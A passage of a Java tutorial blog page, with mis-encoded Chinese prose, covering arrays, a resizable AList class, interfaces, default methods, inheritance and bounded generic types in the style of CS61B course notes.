title="Arrays"></a>Arrays</h2><p>åˆ›å»ºæ•°ç»„æœ‰ä¸‰ç§æœ‰æ•ˆçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];    <span class="hljs-comment">//x = &#123;0, 0, 0&#125;</span><br><span class="hljs-type">int</span>[] y = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span>[] z = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br></code></pre></td></tr></table></figure><p>Javaä¸­å†…ç½®äº†ä¸€äº›ä¸æ•°ç»„æ“ä½œç›¸å…³çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] x = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> x.lenght;    <span class="hljs-comment">//è·å–é•¿åº¦</span><br><span class="hljs-type">int</span>[] b = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>System.arraycopy(b,<span class="hljs-number">0</span>,x,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>);    <br><span class="hljs-comment">/**å¤åˆ¶æ•°ç»„ï¼Œå‚æ•°ä¸ºæºæ•°ç»„ã€å¼€å§‹åæ ‡ã€ç›®æ ‡æ•°ç»„ã€å¼€å§‹åæ ‡ã€ä¸ªæ•°</span><br><span class="hljs-comment">ç­‰åŒäºPythonä¸­çš„ x[3:5]=b[0:2]*/</span><br></code></pre></td></tr></table></figure><p>åœ¨Javaä¸­ï¼Œå¤šç»´æ•°ç»„ä¸­çš„æ¯ä¸ªå­æ•°ç»„å¯ä»¥æœ‰ä¸åŒçš„é•¿åº¦ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™äº›æ•°ç»„è¢«ç§°ä¸ºä¸è§„åˆ™å¤šç»´æ•°ç»„ã€‚Javaä¸­çš„å¤šç»´æ•°ç»„å®é™…ä¸Šæ˜¯æ•°ç»„çš„æ•°ç»„ï¼Œå› æ­¤æ¯ä¸ªå­æ•°ç»„å¯ä»¥ç‹¬ç«‹åœ°å…·æœ‰ä¸åŒçš„é•¿åº¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">pascalsTriangle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>][];<br>pascalsTriangle[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>&#125;;<br>pascalsTriangle[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;;<br>pascalsTriangle[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>&#125;;<br>pascalsTriangle[<span class="hljs-number">3</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>&#125;;<br></code></pre></td></tr></table></figure><h2 id="The-AList"><a href="#The-AList" class="headerlink" title="The AList"></a>The AList</h2><p>å¯¹äºé“¾è¡¨æ¥è¯´ï¼Œè·å–ç¬¬iä¸ªèŠ‚ç‚¹å…ƒç´ éœ€è¦ä»å‰å‘åéå†iæ¬¡ï¼Œè¿™è¯´æ˜æ—¶é—´å¤æ‚åº¦ä¸º <em>O(n)</em> ã€‚è€Œåœ¨ç°ä»£è®¡ç®—æœºä¸Šè®¿é—®æ•°ç»„çš„ç¬¬iä¸ªå…ƒç´ æ‰€éœ€è¦çš„æ—¶é—´æ˜¯æ’å®šçš„ï¼Œå³ <em>O(1)</em> ã€‚</p><p>A naive solution:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AList</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> T[] items;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;<br><br>    <span class="hljs-comment">/** Creates an empty list. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AList</span><span class="hljs-params">()</span> &#123;<br>        items = (T []) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">100</span>];<br>        size = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/** Inserts X into the back of the list. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addLast</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>        items[size] = x;<br>        size = size + <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">/** Returns the item from the back of the list. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLast</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> items[size - <span class="hljs-number">1</span>];<br>    &#125;<br>    <span class="hljs-comment">/** Gets the ith item in the list (0 is the front). */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-keyword">return</span> items[i];<br>    &#125;<br><br>    <span class="hljs-comment">/** Returns the number of items in the list. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> size;<br>    &#125;<br><br>    <span class="hljs-comment">/** Deletes item from back of the list and</span><br><span class="hljs-comment">      * returns deleted item. */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">removeLast</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> getLast();<br>        size = size - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>å¯¹äºè¿™ä¸ªæ–¹æ¡ˆï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼šæ•°ç»„çš„å¤§å°åœ¨ä¸€å¼€å§‹ä¾¿å›ºå®šä¸‹æ¥äº†ï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­æ€»ä¼šæœ‰ç©ºé—´æµªè´¹æˆ–ç©ºé—´ä¸è¶³çš„æƒ…å†µå‡ºç°ã€‚</p><p>è€ƒè™‘æ€§èƒ½ï¼Œæˆ‘ä»¬é‡‡ç”¨ç®—æ³•è®¡ç®—å‡ºæœ€ä¼˜åŒ–çš„æ•°ç»„å¤§å°å¹¶åŠ¨æ€æ›´æ–°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resize</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> &#123;<br>    T[] tmp = (T []) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[capacity];<br>    System.arraycopy(items,<span class="hljs-number">0</span>,tmp,<span class="hljs-number">0</span>,size);<br>    items = tmp;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertBack</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (size == items.length) &#123;<br>        resize(size * RFACTOR);<br>    &#125;<br>    items[size] = x;<br>    size += <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Inheritance-Implements"><a href="#Inheritance-Implements" class="headerlink" title="Inheritance &amp; Implements"></a>Inheritance &amp; Implements</h1><h2 id="Hypernyms-Hyponyms-and-Interfaces-Inheritance"><a href="#Hypernyms-Hyponyms-and-Interfaces-Inheritance" class="headerlink" title="Hypernyms, Hyponyms, and Interfaces Inheritance"></a>Hypernyms, Hyponyms, and Interfaces Inheritance</h2><p>å…·æœ‰ <em>â€œis-aâ€</em> å…³ç³»çš„è¯è¯­ä¹‹é—´äº’ç›¸ä¸ºä¸Šä½è¯ä¸ä¸‹ä½è¯ã€‚</p><p>ä¾‹å¦‚ï¼šç‹—æ˜¯è´µå®¾çŠ¬ã€é›ªæ©‡çŠ¬ã€å“ˆå£«å¥‡ç­‰çš„ä¸Šä½è¯ã€‚ç›¸åï¼Œè´µå®¾çŠ¬ã€é›ªæ©‡çŠ¬å’Œå“ˆå£«å¥‡æ˜¯ç‹—çš„ä¸‹ä½è¯ã€‚</p><p>æ¢ç§è¯´æ³•ï¼Œè´µå®¾çŠ¬ã€é›ªæ©‡çŠ¬ã€å“ˆå£«å¥‡éƒ½æ˜¯ç‹—çš„å­ç±»ï¼Œè€Œç‹—æ˜¯è´µå®¾çŠ¬ã€é›ªæ©‡çŠ¬ã€å“ˆå£«å¥‡ç­‰çš„è¶…ç±»ã€‚</p><p>åœ¨Javaä¸­ï¼Œä¸ºäº†è¡¨è¾¾è¿™ç§å±‚æ¬¡ç»“æ„ï¼Œæˆ‘ä»¬éœ€è¦åšä¸¤ä»¶äº‹ï¼š</p><ol><li>å®šä¹‰ä¸Šä½è¯çš„ç±»å‹</li><li>æŒ‡å®šä¸‹ä½è¯</li></ol><p>æˆ‘ä»¬å®šä¹‰å‡ºæ¥çš„ä¸Šä½è¯ç±»å‹ä¾¿æ˜¯æ‰€è°“çš„æ¥å£ï¼ˆinterfaceï¼‰ï¼Œå®ƒæœ¬è´¨ä¸Šåªå®šä¹‰ç±»æ‰€éœ€è¦çš„åŠŸèƒ½ï¼Œå¹¶ä¸æä¾›å…·ä½“çš„å®ç°æ–¹æ³•ï¼Œè¿™ä¸€ç‚¹å¯ä»¥çœ‹ä½œC++ä¸­çš„æŠ½è±¡åŸºç±»ã€‚</p><p>å¦‚æœæˆ‘ä»¬ä¸ºä¹‹å‰åˆ›å»ºçš„åˆ—è¡¨å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">List61B</span>&lt;Item&gt; &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFirst</span><span class="hljs-params">(Item x)</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addLast</span><span class="hljs-params">(Item y)</span>;<br>    <span class="hljs-keyword">public</span> Item <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> Item <span class="hljs-title function_">getLast</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> Item <span class="hljs-title function_">removeLast</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> Item <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(Item x, <span class="hljs-type">int</span> position)</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŠŠAListå’ŒSLListæŒ‡å®šä¸ºList61Bçš„ä¸‹ä½è¯ï¼Œéœ€è¦ç”¨åˆ° <em>implement</em> å…³é”®å­—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AList</span>&lt;Item&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">List61B</span>&lt;Item&gt; &#123;<br>    ...<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SLList</span>&lt;Item&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">List61B</span>&lt;Item&gt; &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±äºåœ¨æ¥å£ä¸­ï¼Œæˆ‘ä»¬ä»…ä»…å£°æ˜äº†ç±»ä¸­æ‰€åŒ…å«çš„ä¸€äº›æ–¹æ³•ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºå…·ä½“çš„å®ç°è¿‡ç¨‹ï¼Œå› æ­¤åœ¨å­ç±»ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å‡½æ•°è¿›è¡Œé‡å†™è¦†ç›–ã€‚åœ¨å­ç±»ä¸­å®ç°æ‰€éœ€çš„å‡½æ•°æ—¶ï¼Œåœ¨æ–¹æ³•ç­¾åçš„é¡¶éƒ¨åŒ…å« <em>@Override</em> æ ‡è®°å¾ˆæœ‰ç”¨ã€‚å®é™…ä¸Šï¼Œå³ä½¿ä¸åŒ…å«æ ‡ç­¾ï¼Œæˆ‘ä»¬ä¾æ—§åœ¨è¿›è¡Œé‡å†™ï¼ˆOverridingï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addFirst</span><span class="hljs-params">(Item x)</span> &#123;<br>    insert(x, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å’ŒC++ä¸­ä¸€æ ·ï¼Œåœ¨Javaä¸­ï¼Œæ¥å£ç±»å‹çš„å¯¹è±¡å¯ä»¥æ¥å—å­ç±»çš„å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    List61B&lt;String&gt; someList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SLList</span>&lt;String&gt;();<br>    someList.addFirst(<span class="hljs-string">&quot;elk&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“å®ƒè¿è¡Œæ—¶ï¼ŒSLList è¢«åˆ›å»ºï¼Œå®ƒçš„åœ°å€å­˜å‚¨åœ¨ someList å˜é‡ä¸­ã€‚ç„¶åå­—ç¬¦ä¸²â€œelkâ€è¢«æ’å…¥åˆ°addFirstå¼•ç”¨çš„SLListä¸­ã€‚</p><p>åœ¨interfaceä¸­ï¼Œæˆ‘ä»¬ä»…ä»…å®šä¹‰äº†æ–¹æ³•å¤´ä½†å¹¶æ²¡æœ‰å…·ä½“çš„å®ç°ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦åœ¨æ¥å£ä¸­è¿›è¡Œå‡½æ•°çš„å®ç°å¹¶ç»§æ‰¿åˆ°å­ç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°å‰åŠ ä¸Š <em>default</em> å…³é”®å­—ã€‚å¦‚æœå­ç±»ä¸­æ²¡æœ‰é‡å†™ï¼Œåˆ™ä¼šè°ƒç”¨defaultæ–¹æ³•ï¼Œå¦‚æœå­ç±»è¿›è¡Œäº†é‡å†™ï¼Œåˆ™ä¼šä½¿ç”¨å­ç±»ä¸­çš„é‡å†™æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">default</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size(); i += <span class="hljs-number">1</span>) &#123;<br>        System.out.print(get(i) + <span class="hljs-string">&quot; &quot;</span>);<br>    &#125;<br>    System.out.println();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Interface-Inheritance-vs-Implementation-Inheritance"><a href="#Interface-Inheritance-vs-Implementation-Inheritance" class="headerlink" title="Interface Inheritance vs Implementation Inheritance"></a>Interface Inheritance vs Implementation Inheritance</h3><ul><li>Interface Inheritanceï¼ˆæ¥å£ç»§æ‰¿ï¼‰ï¼š<br>æ¥å£ç»§æ‰¿æ˜¯é€šè¿‡æ¥å£æ¥å®šä¹‰çš„ï¼Œä¸€ä¸ªæ¥å£å¯ä»¥æ‰©å±•å¦ä¸€ä¸ªæ¥å£ã€‚<br>é€šè¿‡æ¥å£ç»§æ‰¿ï¼Œå­æ¥å£å¯ä»¥ç»§æ‰¿çˆ¶æ¥å£çš„æŠ½è±¡æ–¹æ³•ï¼Œä½†ä¸ç»§æ‰¿ä»»ä½•å…·ä½“çš„å®ç°ã€‚<br>å­æ¥å£å¯ä»¥å®šä¹‰æ–°çš„æŠ½è±¡æ–¹æ³•ï¼Œæˆ–è€…é€šè¿‡é»˜è®¤æ–¹æ³•æä¾›æ–¹æ³•çš„é»˜è®¤å®ç°ã€‚<br>ç±»å®ç°ä¸€ä¸ªæ¥å£æ—¶ï¼Œå¿…é¡»æä¾›æ¥å£ä¸­æ‰€æœ‰æŠ½è±¡æ–¹æ³•çš„å®ç°ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Mammal</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Mammal</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Dog is eating&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Dog is sleeping&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Implementation Inheritanceï¼ˆå®ç°ç»§æ‰¿ï¼‰ï¼š<br>å®ç°ç»§æ‰¿æ˜¯é€šè¿‡ç±»æ¥å®šä¹‰çš„ï¼Œä¸€ä¸ªç±»å¯ä»¥ç»§æ‰¿å¦ä¸€ä¸ªç±»ã€‚<br>é€šè¿‡å®ç°ç»§æ‰¿ï¼Œå­ç±»ç»§æ‰¿äº†çˆ¶ç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼ŒåŒ…æ‹¬å…·ä½“çš„å®ç°ã€‚<br>å­ç±»å¯ä»¥é€šè¿‡æ–¹æ³•é‡å†™ï¼ˆoverrideï¼‰æ¥æ”¹å˜æˆ–æ‰©å±•çˆ¶ç±»çš„æ–¹æ³•çš„è¡Œä¸ºã€‚<br>Javaä¸­ä¸€ä¸ªç±»åªèƒ½ç»§æ‰¿ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ä½¿æ˜¯å¤šé‡ç»§æ‰¿ä¹Ÿåªèƒ½é€šè¿‡æ¥å£å®ç°ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Drawing shape&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Drawing circle&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Externs-Casting-Higher-Order-Functions"><a href="#Externs-Casting-Higher-Order-Functions" class="headerlink" title="Externs, Casting, Higher Order Functions"></a>Externs, Casting, Higher Order Functions</h2><p>æˆ‘ä»¬ä½¿ç”¨ <em>implements</em> å…³é”®å­—å®šä¹‰äº†ç±»ä¸æ¥å£ä¹‹é—´çš„å…³ç³»ï¼Œå¯¹äºç±»å’Œç±»ä¹‹é—´ã€æ¥å£ä¸æ¥å£ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…³é”®å­— <em>extends</em> è¿›è¡Œå®šä¹‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RotatingSLList</span>&lt;Item&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SLList</span>&lt;Item&gt;&#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VengefulSLList</span>&lt;Item&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SLList</span>&lt;Item&gt;&#123;&#125;<br></code></pre></td></tr></table></figure><p>å­ç±»å¯ä»¥ç»§æ‰¿çˆ¶ç±»ä¸­çš„æ‰€æœ‰å®ä¾‹å’Œé™æ€å˜é‡ï¼Œæ‰€æœ‰æ–¹æ³•ä»¥åŠæ‰€æœ‰åµŒå¥—ç±»ã€‚æ³¨æ„æ„é€ å‡½æ•°ä¸æ˜¯ç»§æ‰¿çš„ï¼Œç§æœ‰æˆå‘˜ä¸èƒ½è¢«å­ç±»ç›´æ¥è®¿é—®ã€‚</p><p>è™½ç„¶æ„é€ å‡½æ•°ä¸æ˜¯ç»§æ‰¿çš„ï¼Œä½† Java è¦æ±‚æ‰€æœ‰æ„é€ å‡½æ•°éƒ½å¿…é¡»ä»è°ƒç”¨å…¶è¶…ç±»çš„æ„é€ å‡½æ•°ä¹‹ä¸€å¼€å§‹ã€‚å¦‚æœæˆ‘ä»¬é€‰æ‹©ä¸è¿™æ ·åšï¼ŒJava å°†è‡ªåŠ¨ä¸ºæˆ‘ä»¬è°ƒç”¨è¶…ç±»çš„<strong>æ— å‚æ„é€ å‡½æ•°</strong>ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœsuper classä¸­çš„æ„é€ å‡½æ•°æ˜¯æœ‰å‚çš„ï¼Œé‚£ä¹ˆè¦æ±‚åœ¨å­ç±»ä¸­æ˜¾å¼åœ°è°ƒç”¨æ­¤æ„é€ å‡½æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">VengefulSLList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">super</span>();<br>    deletedItems = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SLList</span>&lt;Item&gt;();<br>&#125;<br></code></pre></td></tr></table></figure><p>Java ä¸­çš„æ¯ä¸ªç±»éƒ½æ˜¯ <strong>Object</strong> ç±»æˆ– <strong>extends Object</strong> ç±»çš„åä»£ã€‚å³ä½¿ç±»ä¸­æ²¡æœ‰æ˜¾å¼ extends çš„ç±»ä»ç„¶éšå¼æ‰©å±• <strong>Object</strong> ç±»ã€‚</p><p>Object ç±»æä¾›äº†æ¯ä¸ª Object éƒ½åº”è¯¥èƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚ <em>.equals(Object obj)</em> ã€ <em>.hashCode()</em> å’Œ <em>toString()</em> ã€‚</p><p>æœ‰ç•Œç±»å‹å‚æ•°ï¼š<br>åœ¨Javaä¸­ï¼Œæœ‰ç•Œç±»å‹å‚æ•°ï¼ˆbounded type parametersï¼‰æ˜¯æŒ‡åœ¨æ³›å‹ç±»æˆ–æ³›å‹æ–¹æ³•ä¸­å¯¹ç±»å‹å‚æ•°è¿›è¡Œé™åˆ¶ï¼Œä½¿å…¶å¿…é¡»æ˜¯æŸç§ç‰¹å®šç±»å‹æˆ–å…¶å­ç±»å‹ã€‚æœ‰ç•Œç±»å‹å‚æ•°é€šå¸¸ç”¨äºæé«˜æ³›å‹çš„çµæ´»æ€§å’Œå®‰å…¨æ€§ã€‚</p><p>æœ‰ç•Œç±»å‹å‚æ•°æœ‰ä¸¤ç§ï¼šä¸Šç•Œé™å®šï¼ˆupper boundedï¼‰å’Œä¸‹ç•Œé™å®šï¼ˆlower boundedï¼‰ã€‚</p><ol><li>ä¸Šç•Œé™å®šï¼šä½¿ç”¨ extends å…³é”®å­—æŒ‡å®šç±»å‹å‚æ•°å¿…é¡»æ˜¯æŸä¸ªç±»æˆ–æ¥å£çš„å­ç±»ã€‚ä¾‹å¦‚ï¼š</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Myclass</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span>&gt; &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><div class="note note-info">           